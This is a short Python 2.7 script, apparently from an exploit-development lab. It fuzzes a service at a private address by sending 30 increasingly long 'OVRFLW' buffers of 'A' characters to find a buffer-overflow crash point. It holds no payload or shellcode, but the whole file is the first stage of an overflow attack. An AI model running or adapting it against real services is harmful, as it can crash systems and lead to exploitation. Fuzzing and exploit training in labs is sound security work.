#!/usr/bin/env python2.7

import socket
import time

counter = 100
buff = []

while len(buff) < 30:
    buff.append("OVRFLW " + "A" * counter)
    counter += 100

for i in buff:
    print "[+] Sending {} bytes of data".format(len(i))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(("192.168.188.146", 4455))
    msg = s.recv(1024)
    s.send(i)
    msg = s.recv(1024)
    s.close()
    time.sleep(0.5)
